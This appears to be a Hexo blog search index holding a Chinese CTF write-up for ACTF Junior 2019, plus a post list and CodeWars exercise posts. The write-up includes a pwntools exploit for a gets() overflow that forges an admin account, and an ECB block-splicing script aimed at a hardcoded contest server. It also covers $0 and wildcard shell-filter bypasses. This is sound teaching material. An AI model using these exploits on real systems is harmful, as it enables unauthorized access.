<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>博文整理</title>
      <link href="/%E5%8D%9A%E6%96%87%E6%95%B4%E7%90%86/"/>
      <url>/%E5%8D%9A%E6%96%87%E6%95%B4%E7%90%86/</url>
      <content type="html"><![CDATA[<p>打算专门搞个整理用的东西，顺便可以看看自己有多少挖完没填的坑。</p><a id="more"></a><h1 id="Daily-Challenge"><a href="#Daily-Challenge" class="headerlink" title="Daily Challenge"></a>Daily Challenge</h1><ul><li><a href="https://csuwangj.github.io/2018-12-19-Daily-Challenge/">2018-12-19 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-20-Daily-Challenge/">2018-12-20 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-21-Daily-Challenge/">2018-12-21 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-22-Daily-Challenge/">2018-12-22 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-23-Daily-Challenge/">2018-12-23 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-24-Daily-Challenge/">2018-12-24 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-25-Daily-Challenge/">2018-12-25 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-26-Daily-Challenge/">2018-12-26 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-27-Daily-Challenge/">2018-12-27 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-28-Daily-Challenge/">2018-12-28 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-29-Daily-Challenge/">2018-12-29 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-30-Daily-Challenge/">2018-12-30 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2018-12-31-Daily-Challenge/">2018-12-31 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-01-Daily-Challenge/">2019-01-01 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-02-Daily-Challenge/">2019-01-02 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-03-Daily-Challenge/">2019-01-03 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-04-Daily-Challenge/">2019-01-04 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-05-Daily-Challenge/">2019-01-05 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-06-Daily-Challenge/">2019-01-06 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-07-Daily-Challenge/">2019-01-07 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-08-Daily-Challenge/">2019-01-08 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-09-Daily-Challenge/">2019-01-09 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-10-Daily-Challenge/">2019-01-10 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-11-Daily-Challenge/">2019-01-11 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-12-Daily-Challenge/">2019-01-12 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-13-Daily-Challenge/">2019-01-13 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-14-Daily-Challenge/">2019-01-14 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-15-Daily-Challenge/">2019-01-15 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-16-Daily-Challenge/">2019-01-16 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-17-Daily-Challenge/">2019-01-17 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-18-Daily-Challenge/">2019-01-18 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-19-Daily-Challenge/">2019-01-19 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-20-Daily-Challenge/">2019-01-20 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-21-Daily-Challenge/">2019-01-21 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-22-Daily-Challenge/">2019-01-22 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-23-Daily-Challenge/">2019-01-23 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-24-Daily-Challenge/">2019-01-24 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-25-Daily-Challenge/">2019-01-25 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-26-Daily-Challenge/">2019-01-26 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-27-Daily-Challenge/">2019-01-27 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-28-Daily-Challenge/">2019-01-28 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-29-Daily-Challenge/">2019-01-29 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-30-Daily-Challenge/">2019-01-30 Daily Challenge</a></li><li><a href="https://csuwangj.github.io/2019-01-31-Daily-Challenge/">2019-01-31 Daily Challenge</a></li></ul><h1 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h1><ul><li><a href="https://csuwangj.github.io/Cryptography-Engineering-Exercise/">Cryptography_Engineering_Exercise</a>（暂时不打算填）</li><li><a href="https://csuwangj.github.io/OverTheWire-Bandit%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/">OverTheWire-Bandit全攻略+解析</a>（暂时不打算填）</li><li><a href="https://csuwangj.github.io/Exploit-Exercise-Fusion%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/">Exploit-Exercise_Fusion全攻略+解析</a>（有弃坑的想法）</li><li><a href="https://csuwangj.github.io/Exploit-Exercise-Protostar%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/">Exploit-Exercise_Protostar全攻略+解析</a>（EXP放完了，解析暂时不打算填）</li><li><a href="https://csuwangj.github.io/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">逆向工程核心原理学习笔记（一）</a>（还没开始就已经想弃坑了）</li><li><a href="https://csuwangj.github.io/PWN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">PWN学习记录</a>（短时间不可能填了）</li><li><a href="https://csuwangj.github.io/id0-rsa-WP%E5%90%88%E9%9B%86/">id0-rsa WP合集</a>（暂时不打算填）</li></ul><h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><ul><li><a href="https://csuwangj.github.io/AFCTF2018-Crypto-OfficialWriteUp/">AFCTF2018-Crypto_OfficialWriteUp</a>（完结）</li><li><a href="https://csuwangj.github.io/JarvisOJ-WP%E5%90%88%E9%9B%86/">JarvisOJ-WP合集</a>（弃坑）</li><li><a href="https://csuwangj.github.io/HGAME2018-week2%E9%83%A8%E5%88%86WP/">HGAME2018-week2部分WP</a></li><li><a href="https://csuwangj.github.io/HGAME2018-week1WP/">HGAME2018-week1WP</a></li><li><a href="https://csuwangj.github.io/HIT2018%E6%96%B0%E7%94%9F%E8%B5%9B/">HIT2018新生赛部分WP</a></li></ul><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul><li><a href="https://csuwangj.github.io/%E5%9C%A8pip%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91%E7%9A%84%E6%97%B6%E5%80%99%E5%AE%89%E8%A3%85pwntools/">在pip连不上网的时候安装pwntools</a></li><li><a href="https://csuwangj.github.io/CTF%E7%94%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">CTF用环境搭建</a></li><li><a href="https://csuwangj.github.io/%E5%AE%89%E8%A3%85%E5%BC%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/">安装式工具集合</a></li><li><a href="https://csuwangj.github.io/%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/">轻工具个人集合</a></li><li><a href="https://csuwangj.github.io/CTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/">CTF轻工具个人集合</a></li></ul><h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><ul><li><a href="https://csuwangj.github.io/%E5%85%B3%E4%BA%8E%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">关于散列函数的一点思考</a></li></ul>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ACTF Junior 2019 Official WriteUP of CSUWangj&#39;s Challenge</title>
      <link href="/ACTF-Junior-2019-Official-WriteUP-of-CSUWangj-s-Challenge/"/>
      <url>/ACTF-Junior-2019-Official-WriteUP-of-CSUWangj-s-Challenge/</url>
      <content type="html"><![CDATA[<p>日常出锅、、、</p><a id="more"></a><h1 id="Linux-amp-PWN"><a href="#Linux-amp-PWN" class="headerlink" title="Linux&amp;PWN"></a>Linux&amp;PWN</h1><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>首先要了解vim的几个模式</p><p>然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。</p><p>感谢各位没有把容器玩坏。</p><h2 id="No-more-gets1"><a href="#No-more-gets1" class="headerlink" title="No_more_gets1"></a>No_more_gets1</h2><p>查看<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c" target="_blank" rel="noopener">源码</a>，问题出在<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets1/src/src.c#L140" target="_blank" rel="noopener">第140行（rigist()+12）</a>，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。</p><p>一个可用exp（来自给力的学弟）如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">"./a.out"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x10</span> * <span class="string">'a'</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x555555555607</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"6) Exit"</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">"Input your name"</span>)</span><br><span class="line">sh.sendline(<span class="string">'father'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input your password'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaaaaaaaaaaaaa\0admin\0'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"6) Exit"</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.sendline(<span class="string">'admin'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaaaaaaaaaaaaa'</span>)</span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'6'</span>)</span><br></pre></td></tr></table></figure><h2 id="Special-Shell"><a href="#Special-Shell" class="headerlink" title="Special_Shell"></a>Special_Shell</h2><p>这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。</p><p><a href=""><strong>源码</strong></a></p><p>有两个预期解，一方面来说，假如去阅读system()的<a href="https://linux.die.net/man/3/system" target="_blank" rel="noopener">手册</a>会看到</p><blockquote><p>Do not use <strong>system</strong>() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the <strong>*exec</strong>(3)<em> family of functions instead, but not **</em>execlp<strong>(3)<em> or </em></strong>execvp*<em>(3)</em>.</p></blockquote><p>如果去找一些可能的实现可能可以看到下面这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">system</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* balabala */</span></span><br><span class="line">        execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="string">"-c"</span>, command, (<span class="keyword">char</span> *) <span class="literal">NULL</span>);</span><br><span class="line">        _exit(<span class="number">127</span>);                     <span class="comment">/* We could not exec the shell */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* balabala */</span></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以用<code>$0</code>是可以getshell的。</p><p>另一方面来说，<code>man bash</code>一下，了解一下<code>meta character in bash</code>，可以用<code>/???/?? .</code>得出目录，然后<code>/???/??? ????</code>看到flag。</p><h2 id="No-more-gets2"><a href="#No-more-gets2" class="headerlink" title="No_more_gets2"></a>No_more_gets2</h2><p>查看<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c" target="_blank" rel="noopener">源码</a>，问题出在开始就莫名其妙的<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c#L41" target="_blank" rel="noopener">输入用户名</a>。</p><p>只需要了解一下字节序、ascii码，这题就能解决了。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="casear"><a href="#casear" class="headerlink" title="casear"></a>casear</h2><p>移位密码，加密时偏移量为+2，没有改变数字、大小写这几个属性</p><p>至于你说那么多人把数字改成字母、、、</p><p>算了，心累，这题提交失败超过20次的，线下逮到出题人请吃饭。。。</p><h2 id="矾书"><a href="#矾书" class="headerlink" title="矾书"></a>矾书</h2><p>就是把字符画的主体换成了白色字体保存成PDF。</p><p>大家还是很机灵的，顺便如果有个正好符合需求的PDF浏览器，这个题会解决得很快。</p><h2 id="反切码"><a href="#反切码" class="headerlink" title="反切码"></a>反切码</h2><p>这里我偷了懒，并没有深入地考察这个东西、、、只需要百度就能找到出处，因为古音有八个读音，而现在只有四个，所以特地注明了一下用普通话来读。</p><p>（其实当时想吃的是火锅，但是缺声母来着）</p><h2 id="Tiny-RSA"><a href="#Tiny-RSA" class="headerlink" title="Tiny RSA"></a>Tiny RSA</h2><p>就是一个非常非常naive的RSA，简易到可以用手算，希望大家对将要到来的<strong>段老师</strong>教授的密码学有所期待，段老师真的超好！</p><p>（貌似18级开始只有信安才有密码学，但是明明计算机相关的都应该学一点）</p><h2 id="So-called-ECB"><a href="#So-called-ECB" class="headerlink" title="So called ECB"></a>So called ECB</h2><p>只要学到密码学的加密模式肯定会说到不要使用ECB的，而这里为了降低还特地把用户名、密码什么的分开加密再拼接，然而没有人做，感觉很不爽，不想给exp...</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regist</span><span class="params">(r, name, passwd)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Resitering Account"</span></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line">r.sendline(passwd)</span><br><span class="line">r.recvuntil(<span class="string">'to &#123;&#125;'</span>.format(name))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Succeed"</span></span><br><span class="line"><span class="keyword">return</span> r.recv()[<span class="number">2</span>:<span class="number">130</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(r, name, passwd, to, amount)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Transferring"</span></span><br><span class="line">r.sendline(<span class="string">'2'</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line">r.sendline(passwd)</span><br><span class="line">r.sendline(to)</span><br><span class="line">r.sendline(str(amount))</span><br><span class="line">r.recvuntil(<span class="string">'to &#123;&#125;'</span>.format(to))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Succeed"</span></span><br><span class="line"><span class="keyword">return</span> r.recv()[<span class="number">2</span>:<span class="number">130</span>]</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"47.107.33.15"</span>, <span class="number">45338</span>)</span><br><span class="line">name = <span class="string">'a'</span></span><br><span class="line">passwd = <span class="string">'a'</span></span><br><span class="line">admin = <span class="string">'admin'</span></span><br><span class="line">payload = regist(r, name, passwd)[:<span class="number">96</span>]</span><br><span class="line">payload += transfer(r, name, passwd, admin, <span class="number">1001</span>)[<span class="number">96</span>:<span class="number">128</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Stealing money from admin"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Done"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Querying flag"</span></span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line">r.sendline(passwd)</span><br><span class="line">flag = r.recvuntil(<span class="string">"&#125;"</span>)</span><br><span class="line">index = <span class="number">-1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">index = flag.index(<span class="string">'actf'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">index = flag.index(<span class="string">'ACTF'</span>)</span><br><span class="line">flag = flag[index:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[flag] &#123;&#125;"</span>.format(flag)</span><br></pre></td></tr></table></figure><h2 id="Broken-Random"><a href="#Broken-Random" class="headerlink" title="Broken Random"></a>Broken Random</h2><p>这题毕竟源码都给了，要点也都提示到了，其实没什么难度。</p><p>直接的攻击点在于<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Crypto/Broken%20Random/src/src.c#L14" target="_blank" rel="noopener">srand(time(NULL))</a></p><p>srand()的效果是给rand()设置种子，问题就在于用<a href="https://linux.die.net/man/2/time" target="_blank" rel="noopener">time(NULL)</a>。</p><p>从文档里可以知道，time(NULL)返回从1970-01-01 00:00:00 +0000 (UTC)开始到现在的<strong>秒</strong>数。</p><p>所以至少有以下几种攻击方式：</p><ol><li>同时开两个terminal，同时nc一下就很有可能让两个程序用同一个种子，只需要读一个写一个就行。</li><li>把程序自己编译一遍，一边nc一边运行。</li><li>暴力猜一下服务器的时间。（本地暴力）。</li></ol><h2 id="RSA-Lab"><a href="#RSA-Lab" class="headerlink" title="RSA Lab"></a>RSA Lab</h2><p>RSA相关的小问答，没什么难度。实际上这个才是tiny RSA，之前那个算是趣味小游戏的程度:D</p><h2 id="HappyBirthday"><a href="#HappyBirthday" class="headerlink" title="HappyBirthday"></a>HappyBirthday</h2><p>生日攻击啊、、、</p><p>听到有人说这个难度大，我已经把难度降低过了 ，原来的长度有56，60和64的、、、</p><p>50位的话，碰撞一次的代价大概是$2^{25}$。</p><hr><p>好的，前面一顿分析全当放屁，愚蠢的出题人想当然认为[:50]是前50位而忘记了那是十六进制的问题。所以正常难度应该是把代码改成[:13]或者[:12]。。。</p><p>EXP没什么好放的吧，就跑跑暴力的事情。</p><h2 id="Non-cryptography-Hash"><a href="#Non-cryptography-Hash" class="headerlink" title="Non-cryptography Hash"></a>Non-cryptography Hash</h2><p>这个题是看起来难的其实一点也不难的题，因为它的值域一共就、、、那么多、、、</p><p>所以，不管是直接暴力，还是暴力建表然后查找，理论上都是可行的、、、</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><p>这部分题目我个人感觉解法是很多的，在我的认知里取证和渗透类似，不同的人不同的工具都会有不同的效果，而且可能都可以达成目的，这里的解答仅作参考，如果有什么特别的解法请<a href="mailto:CSUwangj@protonmail.com" target="_blank" rel="noopener">告知我</a>，万分感激。</p><p>顺便这几个题对flag的字符串都没有做什么隐藏，所以除了一个人以外都是strings/脱壳后strings解出来的，令出题人感到非常伤心，这根本不好玩嘛</p><h2 id="Popbox"><a href="#Popbox" class="headerlink" title="Popbox"></a>Popbox</h2><p>重定向输出流即可，cmd下可以直接&gt;，powershell需要用Out-File。</p><h2 id="DoNothing"><a href="#DoNothing" class="headerlink" title="DoNothing"></a>DoNothing</h2><p>找程序，可以从启动项/任务管理器里找到一个不一样svchost.exe。</p><p>接下来可以通过查看这个程序相关的活动找到输出文件，里面含有flag。</p><p>也可以直接查看系统里所有的IO/网络/注册表等的操作情况来查找。这里推荐一下微软的工具箱SysinternalSuite里的procmon。</p><h2 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h2><p>flag放在程序的栈上面的，dump下来找一下就行了。</p><p>也可以直接在内存里找。</p><h2 id="WireFish"><a href="#WireFish" class="headerlink" title="WireFish"></a>WireFish</h2><p>WireShark抓一下就出来了</p><hr><p>这条分割线以下不是我出的，代发一下</p><hr>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
            <tag> Forensics </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-28 Daily Challenge</title>
      <link href="/2019-02-28-Daily-Challenge/"/>
      <url>/2019-02-28-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is and <em>Tribonacci Sequence</em> in <em>JavaScript</em>.<br><a id="more"></a></p><h1 id="CodeWars"><a href="#CodeWars" class="headerlink" title="CodeWars"></a>CodeWars</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Tribonacci-Sequence"><a href="#Tribonacci-Sequence" class="headerlink" title="Tribonacci Sequence"></a>Tribonacci Sequence</h3><p>Well met with Fibonacci bigger brother, AKA Tribonacci.</p><p>As the name may already reveal, it works basically like a Fibonacci, but summing the last 3 (instead of 2) numbers of the sequence to generate the next. And, worse part of it, regrettably I won&#39;t get to hear non-native Italian speakers trying to pronounce it :(</p><p>So, if we are to start our Tribonacci sequence with <code>[1, 1, 1]</code> as a starting input (AKA <em>signature</em>), we have this sequence:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">1</span> ,<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">31</span>, ...]</span><br></pre></td></tr></table></figure><p>But what if we started with <code>[0, 0, 1]</code> as a signature? As starting with <code>[0, 1]</code> instead of <code>[1, 1]</code> basically <em>shifts</em> the common Fibonacci sequence by once place, you may be tempted to think that we would get the same sequence shifted by 2 places, but that is not the case and we would get:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">24</span>, ...]</span><br></pre></td></tr></table></figure><p>Well, you may have guessed it by now, but to be clear: you need to create a fibonacci function that given a <strong>signature</strong> array/list, returns <strong>the first n elements - signature included</strong> of the so seeded sequence.</p><p>Signature will always contain 3 numbers; n will always be a non-negative number; if <code>n == 0</code>, then return an empty array and be ready for anything else which is not clearly specified ;)</p><p>If you enjoyed this kata more advanced and generalized version of it can be found in the <a href="http://www.codewars.com/kata/fibonacci-tribonacci-and-friends" target="_blank" rel="noopener">Xbonacci kata</a></p><p><em>[Personal thanks to Professor Jim Fowler on Coursera for his awesome classes that I really recommend to any math enthusiast and for showing me this mathematical curiosity too with his usual contagious passion :)]</em></p>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeWars </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-27 Daily Challenge</title>
      <link href="/2019-02-27-Daily-Challenge/"/>
      <url>/2019-02-27-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is and <em>Find The Parity Outlier</em> in <em>JavaScript</em>.<br><a id="more"></a></p><h1 id="CodeWars"><a href="#CodeWars" class="headerlink" title="CodeWars"></a>CodeWars</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Find-The-Parity-Outlier"><a href="#Find-The-Parity-Outlier" class="headerlink" title="Find The Parity Outlier"></a>Find The Parity Outlier</h3><p>You are given an array (which will have a length of at least 3, but could be very large) containing integers. The array is either entirely comprised of odd integers or entirely comprised of even integers except for a single integer <code>N</code>. Write a method that takes the array as an argument and returns this &quot;outlier&quot; <code>N</code>.</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2602</span>, <span class="number">36</span>]</span><br><span class="line">Should <span class="keyword">return</span>: <span class="number">11</span> (the only odd number)</span><br><span class="line"></span><br><span class="line">[<span class="number">160</span>, <span class="number">3</span>, <span class="number">1719</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">-21</span>]</span><br><span class="line">Should <span class="keyword">return</span>: <span class="number">160</span> (the only even number)</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findOutlier</span>(<span class="params">integers</span>)</span>&#123;</span><br><span class="line">  odd = integers.filter(<span class="function"><span class="params">a</span> =&gt;</span> a&amp;<span class="number">1</span>);</span><br><span class="line">  even = integers.filter(<span class="function"><span class="params">a</span> =&gt;</span> ~a&amp;<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> odd.length===<span class="number">1</span>?odd[<span class="number">0</span>]:even[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findOutlier</span>(<span class="params">integers</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> integers</span><br><span class="line">    .slice(<span 